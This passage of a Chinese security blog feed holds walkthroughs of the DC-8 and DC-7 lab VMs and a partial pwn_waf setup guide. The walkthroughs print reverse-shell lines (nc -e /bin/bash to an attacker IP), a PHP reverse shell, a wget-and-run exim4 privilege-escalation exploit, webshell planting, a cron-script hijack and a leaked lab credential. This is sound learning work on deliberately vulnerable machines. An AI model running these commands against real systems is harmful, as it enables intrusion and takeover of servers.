class="hljs-subst">$target_port</span> -e /bin/sh&quot;</span>;<br><br><span class="hljs-comment">// 执行反弹Shell命令</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$command</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们再次提交一份联系表单即可，可以看到攻击机已经成功接入</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220018529.png" alt="image-20240622001809479"></p><p>开启交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220019331.png" alt="image-20240622001909291"></p><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><h2 id="3-1-命令提权"><a href="#3-1-命令提权" class="headerlink" title="3.1 命令提权"></a>3.1 命令提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220029471.png" alt="image-20240622002908421"></p><blockquote><p>又查到了exim4，这个的价值还是蛮大 的</p></blockquote><p>查查他的版本看看</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">exim <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220032222.png" alt="image-20240622003209154"></p><blockquote><p>ok，版本号4.89，和dc-7一样，但是dc-7没有成功（可能和命令不能直接执行有关），dc-8继续尝试，和dc-7一样的操作</p></blockquote><p>将相应的漏洞利用脚本下载到当前目录，并复制到服务目录中，打开apache2提供服务供目标机子下载脚本；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br>searchsploit -m 46996.sh<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br>sudo systemctl start apache2<br></code></pre></td></tr></table></figure><p>使用目标机子进入<code>/tmp</code>目录下载漏洞利用脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>wget http://192.168.111.129/46996.sh<br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh -m netcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220042940.png" alt="image-20240622004248895"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220047216.png" alt="image-20240622004724159"></p><p>ok提权成功，靶场结束，找找flag吧</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-number">*f</span>lag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220049532.png" alt="image-20240622004913291"></p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-7打靶日记</title>
    <link href="/2024/06/19/dc-7%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/06/19/dc-7%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.31.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312107561.png" alt="image-20240531210756511"></p><p>通过开关靶机查看以及通过MAC地址的标识可以确定目标靶机的ip地址</p><blockquote><p>目标靶机ip地址：192.168.31.170</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT --min-rate 10000 -p- 192.168.31.170 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312111531.png" alt="image-20240531211134496"></p><blockquote><p>开放tcp端口为：22,80</p></blockquote><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.31.170 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312111175.png" alt="image-20240531211142143"></p><blockquote><p>udp留着备用，一般用不上，走走形式</p></blockquote><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p22,80 192.168.31.170 -oA nmapscan/tcpports_Detail<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312128142.png" alt="image-20240531212717884"></p><blockquote><p>扫到了robots.txt，<code>robots.txt</code> 是一个用于网站根目录的文本文件主要作用是告诉搜索引擎爬虫（例如 Googlebot）哪些页面或文件不应被抓取或索引。</p><p>所以我们可以通过该文件去获取网站目录信息，从而绕过目录爆破的过程</p><p>还有就是Drupal 8</p><p>其他信息主要就是操作系统相关的信息Linux3.2-4.9，这种信息一般没办法起到多大的作用</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p22,80 192.168.31.170 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312134831.png" alt="image-20240531213459779"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312137843.png" alt="image-20240531213715813"></p><blockquote><p>扫到了一堆CSRF，没用还有就是robots.txt，端口详细扫描已经扫到了；还有扫到了Drupal version，这个有用，能够确定cms还有一个readme文件，可以看看</p><p>&#x2F;rss.xml</p><p>&#x2F;robots.txt</p><p>&#x2F;INSTALL.txt</p><p>&#x2F;README.TXT</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-网页框架信息"><a href="#2-1-网页框架信息" class="headerlink" title="2.1 网页框架信息"></a>2.1 网页框架信息</h2><ul><li>目录结构</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406021928905.png" alt="image-20240602192859842"></p><ul><li>指纹信息</li></ul><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406021929460.png" alt="image-20240602192935409"></p><ul><li>靶场提示<br><img src="C:/Users/Lin/AppData/Roaming/Typora/typora-user-images/image-20240603135338545.png" alt="image-20240603135338545"></li></ul><blockquote><p>靶场的提示说：</p><p>dc-7引出了一些新概念，但是我想让你找出来那么新概念 :-)</p><p>然而这个靶场并不是所有的都是技术问题，可能你也需要求助于暴力破解和字典攻击，可能并不会成功</p><p>去思考怎么跳出这个盒子是你必须要做的，跳出盒子的方法。:-)</p></blockquote><p>怎么说呢，意思就是想说我们不要被传统固执的思维给囚禁吧，不要老是尝试技巧绕过的东西，有时候可能就是暴力破出来的，或者直接翻找资源找出来的.尝试找一下源码,最好是通过各种作者信息和版本寻找,因为drupal 8，可以尝试找找源码分析也可以找作者的相关博客等分析</p><h2 id="2-2-作者信息检索"><a href="#2-2-作者信息检索" class="headerlink" title="2.2 作者信息检索"></a>2.2 作者信息检索</h2><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406031651170.png" alt="image-20240603165133089"></p><p>因为这个位置暴露了作者的信息，我们可以直接通过搜索引擎搜索该作者及相关信息内容。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406031652053.png" alt="image-20240603165225007"></p><p>可以看到其相应的github账户，通过检索github仓库的信息内容，最后可以在该文件啊中找到相应的账号和密码，但是并不知道有什么作用</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406031653874.png" alt="image-20240603165328829"></p><blockquote><p>username&#x3D;dc7user</p><p>password&#x3D;MdR3xOgB7#dW</p></blockquote><p>可以对数据库、ssh和后台管理系统分别进行登录尝试</p><p>系统后台登录失败；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406031655256.png" alt="image-20240603165515214"></p><p>尝试两边，数据库登录失败</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406031658265.png" alt="image-20240603165812635"></p><p>尝试ssh登录，ssh成功登录</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406031659663.png" alt="image-20240603165944627"></p><p>这里我们先跳转到[3.1 命令提权](##3.1 dc7user用户命令提权)进行尝试命令提权</p><h2 id="2-3-信息收集"><a href="#2-3-信息收集" class="headerlink" title="2.3 信息收集"></a>2.3 信息收集</h2><p>欸嘿，刚才执行<code>exit</code>退出的时候发现点不一样的东西</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181047764.png" alt="image-20240618104736730"></p><blockquote><p>什么？它说：“You have new mail in &#x2F;var&#x2F;mail&#x2F;dc7user”</p><p>这不得去看看？</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181052250.png" alt="image-20240618105214173"></p><p>看了一下，好像是dc7user用户执行命令操作的记录</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181107188.png" alt="image-20240618110706143"></p><p>这似乎是root用户备份网页的文件，且通过<code>/opt/scripts/backups.sh</code>执行进行备份，查看一下该脚本是否存在可利用的地方；因为我并没有执行该命令又记录到了dc7user的邮箱中，所以查询了一下该文件夹的功能，发现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181125008.png" alt="image-20240618112546943"></p><blockquote><p>原来Cron是定时任务的意思，又学到了新东西</p></blockquote><p>那么邮箱的内容也就清晰了，就是说root用户设置了一个定时任务，定时备份网页内容；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181127315.png" alt="image-20240618112719267"></p><p>查看脚本的内容可以知道里面执行了挺多的命令的，其中比较迷惑的命令有<code>drush</code>和<code>gpg</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181128906.png" alt="image-20240618112831869"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181128472.png" alt="image-20240618112852432"></p><p>ok清晰，加密命令可以不管，八成用不上，drush命令，这个有用，说不定dc7user用户可以执行呢；查查看能不能修改密码什么的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> drush<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181131788.png" alt="image-20240618113159753"></p><p>ok，查到命令所在路径了，没有问题，可以执行该命令；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181132918.png" alt="image-20240618113233867"></p><p>drush命令也可以修改管理员密码，那么我们来到<code>/var/www/html/</code>目录下，执行相应命令修改admin管理员密码登录后台</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">drush <span class="hljs-keyword">user</span>-<span class="hljs-keyword">password</span> <span class="hljs-keyword">admin</span> <span class="hljs-comment">--password=&quot;adminadmin233&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181134419.png" alt="image-20240618113418385"></p><p>成功啦！冲冲冲~！</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191243792.png" alt="image-20240619124336682"></p><p>至此，成功登录后台管理系统；</p><p>后续想要找到能够写入一句话木马的地方，但是添加内容时的文本解析并没有能够解析php语言；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191244395.png" alt="image-20240619124419340"></p><p>由于缺乏php语言解析，这个可以再extend插件中进行下载补充</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191410563.png" alt="image-20240619125625630"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191256201.png" alt="image-20240619125641160"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191257591.png" alt="image-20240619125739547"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191257246.png" alt="image-20240619125754210"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191410561.png" alt="image-20240619125808153"></p><p>这里可以找到所有版本的php解析，然后我们找到其中一个支持drupal 8的进行查看下载</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191259838.png" alt="image-20240619125902785"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191259279.png" alt="image-20240619125918219"></p><p>右键复制连接即可得到下载连接，然后我们粘贴到相应的地方进行下载安装即可。</p><blockquote><p><a href="https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191300626.png" alt="image-20240619130006579"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191255917.png" alt="image-20240619125535862"></p><p>安装完毕以后，我们再搜索框输入php，然后选中<code>PHP Filter</code>安装到该网页中；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191301180.png" alt="image-20240619130139137"><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191302461.png" alt="image-20240619130236399"></p><p>再次回到内容发布网页即可看到存在php语言解析的内容了，那么我们就可以再这里发布一句话木马进行解析了；</p><p>我们直接对它本身的首页进行编辑，加入一句话木马，并修改为php语言解析；（也可以直接使用php语言反弹shell脚本）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191322412.png" alt="image-20240619132213367"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191324971.png" alt="image-20240619132437930"></p><p>使用蚁剑测试连接效果</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191323545.png" alt="image-20240619132330499"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191324533.png" alt="image-20240619132449490"></p><p>使用蚁剑的虚拟终端向攻击机反弹一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 192.168.31.221 5555 -e /bin/bash<span class="hljs-comment">#攻击机监听5555端口</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191333939.png" alt="image-20240619133323902"></p><p>这里我们就已经成功的拿到了www-data用户的权限，这时候我们来到[3.2 命令提权](##3.2 www-data用户命令提权)</p><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><h2 id="3-1-dc7user用户命令提权"><a href="#3-1-dc7user用户命令提权" class="headerlink" title="3.1 dc7user用户命令提权"></a>3.1 dc7user用户命令提权</h2><p>首先查看是否存在可以进行提权的命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181027077.png" alt="image-20240618102722969"></p><blockquote><p>可以发现存在可能可以提权的命令有<code>exim4</code>、<code>mount</code>、<code>passwd</code>等等可以尝试</p></blockquote><p>毫无以为的是：mount和passwd完全不可能成功</p><p>查看一下exim4的版本，说不定可以和dc5一样提权成功</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181031865.png" alt="image-20240618103131822"></p><blockquote><p>可以知道exim4的版本是4.89</p></blockquote><p>可以通过searchsploit查看一下是否存在该版本exim4的漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181032615.png" alt="image-20240618103255563"></p><blockquote><p>可以看到确实是又存在该版本的exim4的本地提权漏洞的</p></blockquote><p>将该漏洞下载到本地并启动apache2服务，并将其复制到web目录下让目标机器下载该攻击脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 46996.sh<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br>systemctl start apache2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181039391.png" alt="image-20240618103947357"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.31.221/46996.sh<br><span class="hljs-built_in">chmod</span> +x 46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181041376.png" alt="image-20240618104145331"></p><p>尝试执行获取最高权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./46996.sh -m setuid<br>./46996.sh -m netcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406220055931.png" alt="image-20240622005509648"></p><p>似乎并没有成功，尝试一下其他办法吧，这条路就先到这把。继续从该用户收集信息进行提权回到[2.3 信息收集](##2.3 信息收集)</p><h2 id="3-2-www-data用户命令提权"><a href="#3-2-www-data用户命令提权" class="headerlink" title="3.2 www-data用户命令提权"></a>3.2 www-data用户命令提权</h2><p>与上述的用户提权命令相似，也可以发现exim4命令，再次尝试同样的方式进行提权，好吧，又失败了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191342800.png" alt="image-20240619134203755"></p><h2 id="3-3-backups-sh文件"><a href="#3-3-backups-sh文件" class="headerlink" title="3.3 backups.sh文件"></a>3.3 backups.sh文件</h2><p>还记得刚才这种图嘛，这个脚本似乎是以root用户的身份进行执行的</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406181107188.png" alt="image-20240618110706143"></p><p>然后通过查看www-data用户对backups.sh文件的权限，发现可写可读可执行</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191350028.png" alt="image-20240619135038988"></p><p>那么我们向其中写入一个反弹shell命令，将root权限的shell反弹至我们的攻击主机即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc 192.168.31.221 22222 -e /bin/bash&quot;</span> &gt;&gt; backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191352502.png" alt="image-20240619135258456"></p><p>攻击机监听22222端口，等待反弹shell（不能由www-data用户执行，因为由该用户执行反弹回来的shell依旧是www-data用户）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 22222<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191358160.png" alt="image-20240619135841089"></p><p>通过观察邮件中的时间规律可知，root用户大概是15分钟执行一次这个定时任务，所以我们只需要等待15分钟，shell自然就反弹回来了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191401774.png" alt="image-20240619140155733"></p><p>成功反弹回来了root的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br><span class="hljs-built_in">cat</span> /root/theflag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406191402747.png" alt="image-20240619140247697"></p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol><li>注意一些特殊的文件可能存在root定时执行</li><li>一些脚本文件中可能存在可以利用的地方</li><li>后台管理系统最重要的就是能够获取webshell，拿到站点才有机会进一步提权</li><li>命令提权可能没有效果，可以想象其他的办法，但是也需要进行尝试</li><li>信息检索非常重要，去获取一个系统中比较重要的信息脚本，连接它们之间的关联性进行利用。</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>awd-pwn方法总结</title>
    <link href="/2024/06/10/awd-pwn%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2024/06/10/awd-pwn%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="27f672f2a0331fa02356a86d8941ca6408f37359c1bde6a18dd5f77607b1578e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">~ 猜猜密码是什么? ^_^ ~</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>patch</tag>
      
      <tag>二进制</tag>
      
      <tag>awd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn_waf使用教程</title>
    <link href="/2024/06/02/pwn-waf%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <url>/2024/06/02/pwn-waf%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="下载与设置"><a href="#下载与设置" class="headerlink" title="下载与设置"></a>下载与设置</h1><p>首先将其源码下载下来或者git clone下来到本地<a href="https://github.com/i0gan/pwn_waf">pwn_waf</a></p><p>需要修改的地方是makefile文件，我们要修改日志存放的位置，这边推荐的位置就是在pwn题目的目录下创建一个隐藏文件夹（以点.开头的文件夹名称）。也是为了避免和下面注意一样的坑。</p><blockquote><p>注意：这里的LOG_PATH路径设置有个坑，这里的路径设置跟xinetd配置文件设计的方式有关</p><p>service ctf<br>{<br>disable &#x3D; no<br>socket_type &#x3D; stream<br>protocol    &#x3D; tcp<br>wait        &#x3D; no<br>user        &#x3D; root<br>type        &#x3D; UNLISTED<br>port        &#x3D; 9999<br>bind        &#x3D; 0.0.0.0<br>server      &#x3D; &#x2F;usr&#x2F;sbin&#x2F;chroot<br>server_args &#x3D; –userspec&#x3D;1000:1000 &#x2F;home&#x2F;ctf .&#x2F;pwn<br>banner_fail &#x3D; &#x2F;etc&#x2F;banner_fail<br>per_source&#x3D; 10<br>rlimit_cpu&#x3D; 20<br>}</p><p>如果配置文件与上述类似，这种就是通过&#x2F;usr&#x2F;sbin&#x2F;chroot启动，将文件活动的根进行了一个更改，上述就是默认的初始路径为<code>/home/ctf</code>，且只能操作该目录下的文件（不要企图用..&#x2F;，这个玩意不行！不行！），所以在配置路径时，要以<code>/home/ctf</code>拼接进行配置，假设LOG_PATH&#x3D;&#x2F;home&#x2F;ctf&#x2F;.pwn_waf，则最后日志写入的文件位置为<code>/home/ctf/home/ctf/.pwn_waf</code>，然后又由于没有创建该文件，导致最后nc连接时回出现<code>Open log [/tmp/.waf/13_57_07_36de8.log] file failed!</code>错误</p><p>个人发疯：就是这个破问题，浪费了差不多三天的时间，最后突然悟了想着试试，顶不住了（希望不会有人也是因为这个问题浪费时间）</p></blockquote><h1 id="编译与利用"><a href="#编译与利用" class="headerlink" title="编译与利用"></a>编译与利用</h1><p>编译流量监听的程序，这里只编译流量监听部分。如果有需要拦截转发等功能的可以在自行编译，这个流量窃听在我看来是比较有用的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make catch<br></code></pre></td></tr></table></figure><p>然后就会在项目当前的文件夹下得到一个<code>catch</code>文件，这个文件会实现流量监听功能，同时还会保证原pwn题服务；</p><blockquote><p>对于这个保证原pwn题服务是怎么实现的呢，经过最后方法实现的猜测：（原pwn文件要放到日志目录下，并改名为<code>pwn</code>）</p><p>首先是这个catch文件监听nc连接，然后将连接的数据转发到原pwn程序，得到返回值返回到连接的用户中</p></blockquote><p>然后我们将该<code>catch</code>文件传到部署pwn题的服务器上（哪个目录下都行不碍事，可以的话就先放在待会写日志的那个文件夹下），先保存下来原来的pwn题目文件（可以放到本机上，放置后面因为误删导致各种问题）；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x catch<span class="hljs-comment"># 赋予catch可执行权限</span><br><span class="hljs-built_in">mkdir</span> /home/ctf/.pwn-waf<span class="hljs-comment"># 创建放置日志文件夹</span><br><span class="hljs-comment"># chmod 777 /home/ctf/.pwn-waf# 能给777最好，不能给777可以尝试更改文件夹的归属到部署pwn题目的用户（两者必须要能实现其一才行）</span><br><span class="hljs-built_in">chown</span> ctf:ctf .pwn-waf/<span class="hljs-comment"># 假设部署pwn题目的用户为ctf</span><br><span class="hljs-built_in">cp</span> /home/ctf/orange_cat_diary /home/ctf/.pwn-waf<span class="hljs-comment"># 保存源pwn题程序备份</span><br></code></pre></td></tr></table></figure><p>然后我们用<code>catch</code>文件来替代原来部署的pwn题目，并改名为原来的pwn题目程序的程序名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /home/ctf/.pwn-waf/catch 